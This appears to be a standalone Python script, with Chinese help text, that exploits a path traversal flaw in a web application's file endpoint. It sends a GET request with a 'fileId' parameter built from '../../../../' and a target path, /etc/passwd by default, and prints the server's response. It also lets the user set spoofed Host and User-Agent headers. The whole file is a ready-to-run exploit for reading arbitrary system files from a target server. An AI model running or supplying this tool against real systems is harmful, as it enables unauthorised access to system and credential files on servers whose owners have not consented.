import requests
import argparse

parser = argparse.ArgumentParser(
    description="发送自定义参数的HTTP GET请求，支持路径遍历漏洞测试。",
    usage="%(prog)s -u URL [-f FILEPATH] [-n FILENAME] [-H HOST] [-a USERAGENT]",
    epilog="示例: %(prog)s -u http://example.com/path -f /etc/passwd"
)

parser.add_argument("-u", "--url", required=True, help="目标URL（必填）")
parser.add_argument("-f", "--filepath", default="/etc/passwd", help="要查询的文件路径（默认：/etc/passwd）")
parser.add_argument("-n", "--filename", default="", help="fileName参数值（默认：空）")
parser.add_argument("-H", "--host", default="example.com", help="Host头（默认：example.com）")
parser.add_argument("-a", "--useragent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", help="User-Agent头（默认：Chrome的User-Agent）")

args = parser.parse_args()

url = args.url
params = {
    "fileId": f"../../../../{args.filepath.lstrip('/')}",
    "fileName": args.filename
}

headers = {
    "Host": args.host,
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": args.useragent,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

try:
    response = requests.get(url, params=params, headers=headers)
    response.raise_for_status()
    print("响应内容:")
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"请求失败: {e}")